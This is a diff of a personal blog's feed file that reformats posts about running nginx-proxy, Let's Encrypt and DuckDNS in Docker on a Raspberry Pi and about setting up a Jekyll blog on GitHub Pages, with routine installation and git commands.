-&lt;p&gt;For instance, say I spin up a container of some kind that serves web content out of port 80. If I add the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;VIRTUAL_HOST: &quot;deluqs.duckdns.org&quot;&lt;/code&gt; to that service, then NGINX will see that and setup the necessary config files to proxy any requests for the host “deluqs.duckdns.org” to port 80 within that container. See the pieces starting to come together?&lt;/p&gt;
-
-&lt;p&gt;The next difference with the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; is that I’ve declared some port bindings. These simply mean &lt;code class=&quot;highlighter-rouge&quot;&gt;listen to this port on the host:pass it to this port in the container&lt;/code&gt;. So any traffic that hits port 80 on my Pi will be forwarded to the nginx-proxy container’s port 80.&lt;/p&gt;
-
-&lt;p&gt;The final difference is the volumes! Notably, you will see that I’ve mounted a special &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/run/docker.sock:/tmp/docker.sock:ro&lt;/code&gt; volume, as well as some other named volumes like &lt;code class=&quot;highlighter-rouge&quot;&gt;html:/usr/share/nginx/html&lt;/code&gt;. The first volume is special as it allows communication between the container and the docker daemon running on the host, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;:ro&lt;/code&gt; specifies it is read-only.&lt;/p&gt;
-
-&lt;p&gt;The named volume is similar to the ones we described earlier, but we’re letting docker decide where to store the volume on the host, and we’re giving it a name so that we may reference it later as you shall soon see. Note that named volumes need to be declared at the global level, as seen at the bottom of the compose file.&lt;/p&gt;
-&lt;h2 id=&quot;lets-encrypt&quot;&gt;Let’s Encrypt&lt;/h2&gt;
+&lt;p&gt;If you aren't familiar with &lt;a href=&quot;https://github.com/nginx-proxy/nginx-proxy&quot;&gt;jwilder's nginx-proxy&lt;/a&gt;, what it does is observe the Docker containers you run, and if any have the environment variable &lt;code&gt;VIRTUAL_HOST&lt;/code&gt;, it will automagically setup an NGINX proxy and point it to that container!&lt;/p&gt;
+&lt;p&gt;For instance, say I spin up a container of some kind that serves web content out of port 80. If I add the environment variable &lt;code&gt;VIRTUAL_HOST: &amp;quot;deluqs.duckdns.org&amp;quot;&lt;/code&gt; to that service, then NGINX will see that and setup the necessary config files to proxy any requests for the host &amp;quot;deluqs.duckdns.org&amp;quot; to port 80 within that container. See the pieces starting to come together?&lt;/p&gt;
+&lt;p&gt;The next difference with the &lt;code&gt;docker-compose.yml&lt;/code&gt; is that I've declared some port bindings. These simply mean &lt;code&gt;listen to this port on the host:pass it to this port in the container&lt;/code&gt;. So any traffic that hits port 80 on my Pi will be forwarded to the nginx-proxy container's port 80.&lt;/p&gt;
+&lt;p&gt;The final difference is the volumes! Notably, you will see that I've mounted a special &lt;code&gt;/var/run/docker.sock:/tmp/docker.sock:ro&lt;/code&gt; volume, as well as some other named volumes like &lt;code&gt;html:/usr/share/nginx/html&lt;/code&gt;. The first volume is special as it allows communication between the container and the docker daemon running on the host, and the &lt;code&gt;:ro&lt;/code&gt; specifies it is read-only.&lt;/p&gt;
+&lt;p&gt;The named volume is similar to the ones we described earlier, but we're letting docker decide where to store the volume on the host, and we're giving it a name so that we may reference it later as you shall soon see. Note that named volumes need to be declared at the global level, as seen at the bottom of the compose file.&lt;/p&gt;
+&lt;h2 id=&quot;lets-encrypt&quot;&gt;Let's Encrypt&lt;/h2&gt;
 &lt;p&gt;Finally, the magic that turns SSL on for all nginx-proxy sites.&lt;/p&gt;
 &lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
@@ -589,137 +474,97 @@ o make sure everything is working properly, let’s run the infamous &lt;code cl
   &lt;span class=&quot;na&quot;&gt;dhparam&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;certs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This has nothing you haven’t seen before, but I’m including it for completeness sake. You’ll notice that again, I’m using an &lt;a href=&quot;https://github.com/aidanstansfield/docker-letsencrypt-nginx-proxy-companion&quot;&gt;image&lt;/a&gt; that I have built myself, based upon &lt;a href=&quot;https://github.com/nginx-proxy/docker-letsencrypt-nginx-proxy-companion&quot;&gt;jrcs’ docker-letsencrypt-nginx-proxy-companion&lt;/a&gt;, so that it supports the arm32v7 architecture.&lt;/p&gt;
-
-&lt;p&gt;Notice that we’re using the same named volumes as the nginx-proxy service, and that allows these two seperate services to both access the same files.&lt;/p&gt;
-
+&lt;p&gt;This has nothing you haven't seen before, but I'm including it for completeness sake. You'll notice that again, I'm using an &lt;a href=&quot;https://github.com/aidanstansfield/docker-letsencrypt-nginx-proxy-companion&quot;&gt;image&lt;/a&gt; that I have built myself, based upon &lt;a href=&quot;https://github.com/nginx-proxy/docker-letsencrypt-nginx-proxy-companion&quot;&gt;jrcs' docker-letsencrypt-nginx-proxy-companion&lt;/a&gt;, so that it supports the arm32v7 architecture.&lt;/p&gt;
+&lt;p&gt;Notice that we're using the same named volumes as the nginx-proxy service, and that allows these two seperate services to both access the same files.&lt;/p&gt;
 &lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;
-&lt;p&gt;So that’s how I run my DuckDNS, NGINX and Let’s Encrypt services on my Raspberry Pi with just a single &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose up&lt;/code&gt;. Note that I never have to touch NGINX config files, or deal with setting up SSL, all I need to do is pass in an environment variable or two into any container I spin up and it’s all handled for me, &lt;strong&gt;how neat.&lt;/strong&gt; Hope you found some of this useful!&lt;/p&gt;</content><author><name></name></author><category term="raspberry" /><category term="pi" /><category term="nginx" /><category term="let's encrypt" /><category term="duckdns" /><summary type="html">So as I mentioned in my previous post, I wanted to use my Raspberry Pi as a webserver so that I could play around with web development projects. More specifically, I wanted to run NGINX, with autogenerated SSL certs from Let’s Encrypt, and I wanted a Dynamic DNS address so that I didn’t have to deal with changing IP addresses provided by my ISP. Oh, and I wanted this to all be described by one simple docker-compose.yml file.</summary></entry><entry><title type="html">The Raspberry Pi Project: Part 1 - The Context</title><link href="https://aidanstansfield.github.io/2020/03/14/raspi-p1.html" rel="alternate" type="text/html" title="The Raspberry Pi Project: Part 1 - The Context" /><published>2020-03-14T19:30:00+10:00</published><updated>2020-03-14T19:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/14/raspi-p1</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/14/raspi-p1.html">&lt;p&gt;So I recently acquired a &lt;a href=&quot;https://core-electronics.com.au/raspberry-pi-4-model-b-4gb.html&quot;&gt;Raspberry Pi 4 with 4GB of RAM&lt;/a&gt; accompanied by a fantastic &lt;a href=&quot;https://core-electronics.com.au/flirc-raspberry-pi-4-case.html&quot;&gt;FLIRC case&lt;/a&gt; to replace my Raspberry Pi 3B+. Up until now, I had been using my Raspberry Pi 3B+ for a mix of things, including:&lt;/p&gt;
+&lt;p&gt;So that's how I run my DuckDNS, NGINX and Let's Encrypt services on my Raspberry Pi with just a single &lt;code&gt;docker-compose up&lt;/code&gt;. Note that I never have to touch NGINX config files, or deal with setting up SSL, all I need to do is pass in an environment variable or two into any container I spin up and it's all handled for me, &lt;strong&gt;how neat.&lt;/strong&gt; Hope you found some of this useful!&lt;/p&gt;</content><author><name></name></author><category term="raspberry" /><category term="pi" /><category term="nginx" /><category term="let's encrypt" /><category term="duckdns" /><summary type="html">So as I mentioned in my previous post, I wanted to use my Raspberry Pi as a webserver so that I could play around with web development projects. More specifically, I wanted to run NGINX, with autogenerated SSL certs from Let's Encrypt, and I wanted a Dynamic DNS address so that I didn't have to deal with changing IP addresses provided by my ISP. Oh, and I wanted this to all be described by one simple docker-compose.yml file.</summary></entry><entry><title type="html">The Raspberry Pi Project: Part 1 - The Context</title><link href="https://aidanstansfield.github.io/2020/03/14/raspi-p1.html" rel="alternate" type="text/html" title="The Raspberry Pi Project: Part 1 - The Context" /><published>2020-03-14T19:30:00+10:00</published><updated>2020-03-14T19:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/14/raspi-p1</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/14/raspi-p1.html">&lt;p&gt;So I recently acquired a &lt;a href=&quot;https://core-electronics.com.au/raspberry-pi-4-model-b-4gb.html&quot;&gt;Raspberry Pi 4 with 4GB of RAM&lt;/a&gt; accompanied by a fantastic &lt;a href=&quot;https://core-electronics.com.au/flirc-raspberry-pi-4-case.html&quot;&gt;FLIRC case&lt;/a&gt; to replace my Raspberry Pi 3B+. Up until now, I had been using my Raspberry Pi 3B+ for a mix of things, including:&lt;/p&gt;
 &lt;ol&gt;
-  &lt;li&gt;A web server running &lt;a href=&quot;https://www.nginx.com/&quot;&gt;NGINX&lt;/a&gt;, with automated SSL certs from &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let’s Encrypt&lt;/a&gt; so I can serve cool web content I develop.&lt;/li&gt;
-  &lt;li&gt;A DNS server running &lt;a href=&quot;https://pi-hole.net/&quot;&gt;Pihole&lt;/a&gt; to block ads on my network&lt;/li&gt;
-  &lt;li&gt;An &lt;a href=&quot;https://openvpn.net/&quot;&gt;OpenVPN&lt;/a&gt; server so I can VPN into my home network from wherever&lt;/li&gt;
-  &lt;li&gt;A Dynamic DNS updater for &lt;a href=&quot;https://www.duckdns.org/&quot;&gt;DuckDNS&lt;/a&gt;, so I don’t have to deal with pesky IP addresses.&lt;/li&gt;
-  &lt;li&gt;A development environment for various embedded systems projects that use the Pi’s GPIO pins.&lt;/li&gt;
+&lt;li&gt;A web server running &lt;a href=&quot;https://www.nginx.com/&quot;&gt;NGINX&lt;/a&gt;, with automated SSL certs from &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let's Encrypt&lt;/a&gt; so I can serve cool web content I develop.&lt;/li&gt;
+&lt;li&gt;A DNS server running &lt;a href=&quot;https://pi-hole.net/&quot;&gt;Pihole&lt;/a&gt; to block ads on my network&lt;/li&gt;
+&lt;li&gt;An &lt;a href=&quot;https://openvpn.net/&quot;&gt;OpenVPN&lt;/a&gt; server so I can VPN into my home network from wherever&lt;/li&gt;
+&lt;li&gt;A Dynamic DNS updater for &lt;a href=&quot;https://www.duckdns.org/&quot;&gt;DuckDNS&lt;/a&gt;, so I don't have to deal with pesky IP addresses.&lt;/li&gt;
+&lt;li&gt;A development environment for various embedded systems projects that use the Pi's GPIO pins.&lt;/li&gt;
 &lt;/ol&gt;
-
-&lt;p&gt;So now comes the fun part of migrating all of these services over to the new Pi. Unfortuantely, since the Raspberry Pi 4 runs on a newer version of Raspbian (Buster), it’s not just a simple case of swapping over the SD cards and it all working.&lt;/p&gt;
-
+&lt;p&gt;So now comes the fun part of migrating all of these services over to the new Pi. Unfortuantely, since the Raspberry Pi 4 runs on a newer version of Raspbian (Buster), it's not just a simple case of swapping over the SD cards and it all working.&lt;/p&gt;
 &lt;p&gt;So I started thinking to myself,&lt;/p&gt;
 &lt;blockquote&gt;
-  &lt;p&gt;How can I make this migration/setup easier for the future?&lt;/p&gt;
+&lt;p&gt;How can I make this migration/setup easier for the future?&lt;/p&gt;
 &lt;/blockquote&gt;
-
-&lt;p&gt;The answer I eventually arrived at, &lt;strong&gt;Docker &amp;amp; Docker Compose.&lt;/strong&gt; The reason I decided upon this approach is that in the event that my SD card dies, or I want to setup a new SD card for X reason, all I should have to do is install the OS and Docker/Docker Compose, and then &lt;strong&gt;BAM&lt;/strong&gt; everything is up and running with a few &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose up&lt;/code&gt;’s. Sounds easy, right?&lt;/p&gt;
-
-&lt;p&gt;Well that’s what I thought when I set out on this journey, but boy did I have a few late nights. In this series, I plan to detail this journey, rabbit holes and source code included. Stay tuned!&lt;/p&gt;</content><author><name></name></author><category term="raspberry" /><category term="pi" /><category term="nginx" /><category term="lets encrypt" /><category term="openvpn" /><category term="duckdns" /><category term="pihole" /><summary type="html">So I recently acquired a Raspberry Pi 4 with 4GB of RAM accompanied by a fantastic FLIRC case to replace my Raspberry Pi 3B+. Up until now, I had been using my Raspberry Pi 3B+ for a mix of things, including: A web server running NGINX, with automated SSL certs from Let’s Encrypt so I can serve cool web content I develop. A DNS server running Pihole to block ads on my network An OpenVPN server so I can VPN into my home network from wherever A Dynamic DNS updater for DuckDNS, so I don’t have to deal with pesky IP addresses. A development environment for various embedded systems projects that use the Pi’s GPIO pins.</summary></entry><entry><title type="html">Welcome to my blog!</title><link href="https://aidanstansfield.github.io/2020/03/14/welcome-to-my-blog.html" rel="alternate" type="text/html" title="Welcome to my blog!" /><published>2020-03-14T14:26:00+10:00</published><updated>2020-03-14T14:26:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/14/welcome-to-my-blog</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/14/welcome-to-my-blog.html">&lt;p&gt;G’day! Today marks the day that I finally became &lt;em&gt;one of those guys&lt;/em&gt; who has his own blog. The main reason for making this blog is so that I can show it off to other people (emplyers, friends, etc.). In this blog, I plan on documenting various things I do related to IT that I find interesting and worth sharing. You can expect this to include some home projects on my raspberry pi, walkthroughs of &lt;a href=&quot;https://hackthebox.eu&quot;&gt;hackthebox&lt;/a&gt;/ctf’s, and generally anything else I find cool. Also, I find myself funny, so please try not to cringe too hard at what I write/take offence from anything I say.&lt;/p&gt;
-
-&lt;p&gt;For my first post, I figured I’d document how I made &lt;em&gt;this&lt;/em&gt;, the blog itself. The process I went through to set it up, and how I made it look so damn pretty.&lt;/p&gt;
-
+&lt;p&gt;The answer I eventually arrived at, &lt;strong&gt;Docker &amp;amp; Docker Compose.&lt;/strong&gt; The reason I decided upon this approach is that in the event that my SD card dies, or I want to setup a new SD card for X reason, all I should have to do is install the OS and Docker/Docker Compose, and then &lt;strong&gt;BAM&lt;/strong&gt; everything is up and running with a few &lt;code&gt;docker-compose up&lt;/code&gt;'s. Sounds easy, right?&lt;/p&gt;
+&lt;p&gt;Well that's what I thought when I set out on this journey, but boy did I have a few late nights. In this series, I plan to detail this journey, rabbit holes and source code included. Stay tuned!&lt;/p&gt;</content><author><name></name></author><category term="raspberry" /><category term="pi" /><category term="nginx" /><category term="lets encrypt" /><category term="openvpn" /><category term="duckdns" /><category term="pihole" /><summary type="html">So I recently acquired a Raspberry Pi 4 with 4GB of RAM accompanied by a fantastic FLIRC case to replace my Raspberry Pi 3B+. Up until now, I had been using my Raspberry Pi 3B+ for a mix of things, including: A web server running NGINX, with automated SSL certs from Let's Encrypt so I can serve cool web content I develop. A DNS server running Pihole to block ads on my network An OpenVPN server so I can VPN into my home network from wherever A Dynamic DNS updater for DuckDNS, so I don't have to deal with pesky IP addresses. A development environment for various embedded systems projects that use the Pi's GPIO pins.</summary></entry><entry><title type="html">Welcome to my blog!</title><link href="https://aidanstansfield.github.io/2020/03/14/welcome-to-my-blog.html" rel="alternate" type="text/html" title="Welcome to my blog!" /><published>2020-03-14T14:26:00+10:00</published><updated>2020-03-14T14:26:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/14/welcome-to-my-blog</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/14/welcome-to-my-blog.html">&lt;p&gt;G'day! Today marks the day that I finally became &lt;em&gt;one of those guys&lt;/em&gt; who has his own blog. The main reason for making this blog is so that I can show it off to other people (emplyers, friends, etc.). In this blog, I plan on documenting various things I do related to IT that I find interesting and worth sharing. You can expect this to include some home projects on my raspberry pi, walkthroughs of &lt;a href=&quot;https://hackthebox.eu&quot;&gt;hackthebox&lt;/a&gt;/ctf's, and generally anything else I find cool. Also, I find myself funny, so please try not to cringe too hard at what I write/take offence from anything I say.&lt;/p&gt;
+&lt;p&gt;For my first post, I figured I'd document how I made &lt;em&gt;this&lt;/em&gt;, the blog itself. The process I went through to set it up, and how I made it look so damn pretty.&lt;/p&gt;
 &lt;h1 id=&quot;how-i-setup-my-blog&quot;&gt;How I setup my blog&lt;/h1&gt;
 &lt;h2 id=&quot;intro-to-github-pages&quot;&gt;Intro to GitHub Pages&lt;/h2&gt;
-
-&lt;p&gt;To start with, if you didn’t already know, this is running on a service called &lt;a href=&quot;https://pages.github.com/&quot;&gt;GitHub Pages&lt;/a&gt;. Essentially, the quickstart is as follows:&lt;/p&gt;
-
+&lt;p&gt;To start with, if you didn't already know, this is running on a service called &lt;a href=&quot;https://pages.github.com/&quot;&gt;GitHub Pages&lt;/a&gt;. Essentially, the quickstart is as follows:&lt;/p&gt;
 &lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;You create a GitHub repo with the name &lt;code class=&quot;highlighter-rouge&quot;&gt;$USERNAME.github.io&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;$USERNAME&lt;/code&gt; is your own GitHub username.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Next, you clone your repo.&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; git clone https://github.com/$USERNAME/$USERNAME.github.io
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Add whatever HTML you want&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; echo &quot;Hello World&quot; &amp;gt; index.html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Push it&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; git add -A
- git commit -m 'hello world'
- git push -u origin master
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GitHub will automagically see your new commit, and in a short time, build and publish your code available for you to visit at your very own website https://$USERNAME.github.io&lt;/p&gt;
-  &lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;You create a GitHub repo with the name &lt;code&gt;$USERNAME.github.io&lt;/code&gt; where &lt;code&gt;$USERNAME&lt;/code&gt; is your own GitHub username.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Next, you clone your repo.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone https://github.com/$USERNAME/$USERNAME.github.io
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Add whatever HTML you want&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;Hello World&amp;quot; &amp;gt; index.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Push it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git add -A
+git commit -m 'hello world'
+git push -u origin master
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;GitHub will automagically see your new commit, and in a short time, build and publish your code available for you to visit at your very own website https://$USERNAME.github.io&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
-
 &lt;p&gt;&lt;strong&gt;How cool!&lt;/strong&gt;&lt;/p&gt;
-
 &lt;h2 id=&quot;intro-to-jekyll&quot;&gt;Intro to Jekyll&lt;/h2&gt;
-
 &lt;p&gt;Ok so having GitHub build and host a plain old HTML site for you is kinda cool I guess, but nothing to write home about. What &lt;em&gt;is&lt;/em&gt; cool however is the combination of Jekyll and GitHub Pages. But what is Jekyll you ask?&lt;/p&gt;
-
 &lt;p&gt;Jekyll is a static site generator with with built-in support for GitHub pages. Jekyll takes special Markdown and HTML files, and builds out a completely static website based upon them. For more about what Jekyll is and how it works, check out their &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
-
 &lt;p&gt;To use Jekyll with your own website:&lt;/p&gt;
-
 &lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;First install Ruby, Bundler and Jekyll. For Debian based systems:&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sudo apt update &amp;amp;&amp;amp; apt install ruby-full &amp;amp;&amp;amp; gem install bundler jekyll
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Create your new Jekyll site inside your repositories folder&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; bundle exec jekyll new /path/to/repository
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;If you want to have GitHub Pages automagically build your Jekyll site for you, open up the Gemfile and follow the instructions within the comments of that file regarding GitHub Pages.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;I’d make sure all the dependencies are up to date with&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cd /path/to/repository &amp;amp;&amp;amp; bundle update
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Push your new code and wait for it to build.&lt;/li&gt;
-  &lt;li&gt;Congrats, you now have a cooler looking website that runs on Jekyll. To see all the benefits of using Jekyll, such as themes, templating, syntax highlighting and more, I’d encourage you again to check out their &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;website&lt;/a&gt;. I’d also recommend checking out how to build &amp;amp; serve your site locally for development purposes, as documented &lt;a href=&quot;https://help.github.com/en/github/working-with-github-pages/testing-your-github-pages-site-locally-with-jekyll&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;First install Ruby, Bundler and Jekyll. For Debian based systems:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt update &amp;amp;&amp;amp; apt install ruby-full &amp;amp;&amp;amp; gem install bundler jekyll
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Create your new Jekyll site inside your repositories folder&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bundle exec jekyll new /path/to/repository
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;If you want to have GitHub Pages automagically build your Jekyll site for you, open up the Gemfile and follow the instructions within the comments of that file regarding GitHub Pages.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;I'd make sure all the dependencies are up to date with&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd /path/to/repository &amp;amp;&amp;amp; bundle update
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Push your new code and wait for it to build.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Congrats, you now have a cooler looking website that runs on Jekyll. To see all the benefits of using Jekyll, such as themes, templating, syntax highlighting and more, I'd encourage you again to check out their &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;website&lt;/a&gt;. I'd also recommend checking out how to build &amp;amp; serve your site locally for development purposes, as documented &lt;a href=&quot;https://help.github.com/en/github/working-with-github-pages/testing-your-github-pages-site-locally-with-jekyll&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
-
 &lt;h2 id=&quot;making-jekyll-sexy&quot;&gt;Making Jekyll Sexy&lt;/h2&gt;
-&lt;p&gt;If you’re following along with this post, you might be wondering why my Jekyll site looks cooler than the black and white default of Jekyll. The answer is &lt;em&gt;themes&lt;/em&gt;. After trolling through the interwebs for about an hour or so, I stumbled upon this theme that I really liked, called &lt;a href=&quot;https://github.com/bitbrain/jekyll-dash&quot;&gt;Jekyll Dash&lt;/a&gt;. I decided this would be the theme for my blog, so I went about setting it up. &lt;strong&gt;This is where the fun begins.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Now in it’s current state, GitHub Pages is not capable of accepting user supplied plugins/gems to be installed as part of the build process, meaning that you cannot supply a theme (unless it’s one of the 13 supported themes) as follows in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt; file.&lt;/p&gt;
-
+&lt;p&gt;If you're following along with this post, you might be wondering why my Jekyll site looks cooler than the black and white default of Jekyll. The answer is &lt;em&gt;themes&lt;/em&gt;. After trolling through the interwebs for about an hour or so, I stumbled upon this theme that I really liked, called &lt;a href=&quot;https://github.com/bitbrain/jekyll-dash&quot;&gt;Jekyll Dash&lt;/a&gt;. I decided this would be the theme for my blog, so I went about setting it up. &lt;strong&gt;This is where the fun begins.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Now in it's current state, GitHub Pages is not capable of accepting user supplied plugins/gems to be installed as part of the build process, meaning that you cannot supply a theme (unless it's one of the 13 supported themes) as follows in the &lt;code&gt;_config.yml&lt;/code&gt; file.&lt;/p&gt;
 &lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;theme&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;jekyll-dash&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;GitHub’s workaround for this is to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;remote_theme&lt;/code&gt; option which allows you to use any theme available in a GitHub repository as shown.&lt;/p&gt;
-
+&lt;p&gt;GitHub's workaround for this is to use the &lt;code&gt;remote_theme&lt;/code&gt; option which allows you to use any theme available in a GitHub repository as shown.&lt;/p&gt;
 &lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;remote_theme&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;bitbrain/jekyll-dash&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This solved a lot of my problems, however the theme didn’t quite work as it did on &lt;a href=&quot;https://bitbrain.github.io&quot;&gt;Bitbrain’s blog&lt;/a&gt;. So I forked the the &lt;a href=&quot;https://github.com/bitbrain/jekyll-dash&quot;&gt;Jekyll Dash&lt;/a&gt; repo and started customizing the theme to make it look the way it was supposed to.&lt;/p&gt;
-
-&lt;p&gt;This solved the majority of problems, except for the fact that you still couldn’t supply your own plugins to be used as part of the build process for the site. In this case, the jekyll-dash theme used a &lt;code class=&quot;highlighter-rouge&quot;&gt;liquid-md5&lt;/code&gt; plugin to help support Gravatar image URL’s.&lt;/p&gt;
-
-&lt;p&gt;So after a bit of researching, I decided the best approach would be to build the site locally (that way I could use whatever plugins I pleased), and then push the result to GitHub for free hosting. Here’s how I achieved this:&lt;/p&gt;
-
+&lt;p&gt;This solved a lot of my problems, however the theme didn't quite work as it did on &lt;a href=&quot;https://bitbrain.github.io&quot;&gt;Bitbrain's blog&lt;/a&gt;. So I forked the the &lt;a href=&quot;https://github.com/bitbrain/jekyll-dash&quot;&gt;Jekyll Dash&lt;/a&gt; repo and started customizing the theme to make it look the way it was supposed to.&lt;/p&gt;
+&lt;p&gt;This solved the majority of problems, except for the fact that you still couldn't supply your own plugins to be used as part of the build process for the site. In this case, the jekyll-dash theme used a &lt;code&gt;liquid-md5&lt;/code&gt; plugin to help support Gravatar image URL's.&lt;/p&gt;
+&lt;p&gt;So after a bit of researching, I decided the best approach would be to build the site locally (that way I could use whatever plugins I pleased), and then push the result to GitHub for free hosting. Here's how I achieved this:&lt;/p&gt;
 &lt;ol&gt;
-  &lt;li&gt;Create a new branch called ‘source’. Since the repository is what GitHub terms a “user” site and not a “project” site, the only publishing source available is the master branch. This means that the code GitHub will build and publish will be taken from the master branch, so we will need another branch to store the source code for building our blog! &lt;strong&gt;NOTE:&lt;/strong&gt; If you do this, I would recommend changing the default branch of your repo to ‘source’!
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; git checkout -b source
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
